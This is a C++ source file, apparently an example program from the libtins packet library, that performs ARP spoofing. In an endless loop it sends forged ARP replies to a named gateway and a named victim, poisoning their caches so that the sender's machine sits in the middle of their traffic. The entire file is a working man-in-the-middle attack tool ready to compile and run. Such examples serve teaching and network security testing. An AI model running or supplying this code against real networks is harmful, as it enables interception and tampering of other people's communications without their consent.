/*
 * Copyright (c) 2014, Matias Fontanini
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions are
 * met:
 *
 * * Redistributions of source code must retain the above copyright
 *   notice, this list of conditions and the following disclaimer.
 * * Redistributions in binary form must reproduce the above
 *   copyright notice, this list of conditions and the following disclaimer
 *   in the documentation and/or other materials provided with the
 *   distribution.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
 * "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
 * LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
 * A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
 * OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,
 * SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT
 * LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
 * DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
 * THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
 * OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 *
 */


#include <iostream>
#include <string>
#include <stdexcept>
#include <cstdlib>
#include <unistd.h>
#include <tins/arp.h>
#include <tins/network_interface.h>
#include <tins/utils.h>
#include <tins/ethernetII.h>
#include <tins/packet_sender.h>

using namespace std;
using namespace Tins;


void do_arp_spoofing(NetworkInterface iface, IPv4Address gw, IPv4Address victim, 
  const NetworkInterface::Info &info) 
{
    PacketSender sender;
    EthernetII::address_type gw_hw, victim_hw;
    
    // Resolves gateway's hardware address.
    gw_hw = Utils::resolve_hwaddr(iface, gw, sender);
    
    // Resolves victim's hardware address.
    victim_hw = Utils::resolve_hwaddr(iface, victim, sender);

    // Print out the hw addresses we're using.
    cout << " Using gateway hw address: " << gw_hw << "\n";
    cout << " Using victim hw address:  " << victim_hw << "\n";
    cout << " Using own hw address:     " << info.hw_addr << "\n";
    
    /* We tell the gateway that the victim is at out hw address,
     * and tell the victim that the gateway is at out hw address */
    ARP gw_arp(gw, victim, gw_hw, info.hw_addr), 
        victim_arp(victim, gw, victim_hw, info.hw_addr);
    // We are "replying" ARP requests
    gw_arp.opcode(ARP::REPLY);
    victim_arp.opcode(ARP::REPLY);
    
    /* The packet we'll send to the gateway and victim. 
     * We include our hw address as the source address
     * in ethernet layer, to avoid possible packet dropping
     * performed by any routers. */
    EthernetII to_gw = EthernetII(gw_hw, info.hw_addr) / gw_arp;
    EthernetII to_victim = EthernetII(victim_hw, info.hw_addr) / victim_arp;
    while(true) {
        // Just send them once every 5 seconds.
        sender.send(to_gw, iface);
        sender.send(to_victim, iface);
        sleep(5);
    }
}

int main(int argc, char *argv[]) {
    if(argc != 3 && cout << "Usage: " << *argv << " <Gateway> <Victim>\n")
        return 1;
    IPv4Address gw, victim;
    EthernetII::address_type own_hw;
    try {
        // Convert dotted-notation ip addresses to integer. 
        gw     = argv[1];
        victim = argv[2];
    }
    catch(...) {
        cout << "Invalid ip found...\n";
        return 2;
    }
    
    NetworkInterface iface;
    NetworkInterface::Info info;
    try {
        // Get the interface which will be the gateway for our requests.
        iface = gw;
        // Lookup the interface id. This will be required while forging packets.
        // Find the interface hardware and ip address.
        info = iface.addresses();
    }
    catch(std::runtime_error &ex) {
        cout << ex.what() << endl;
        return 3;
    }
    try {
        do_arp_spoofing(iface, gw, victim, info);
    }
    catch(std::runtime_error &ex) {
        std::cout << "Runtime error: " << ex.what() << std::endl;
        return 7;
    }
}

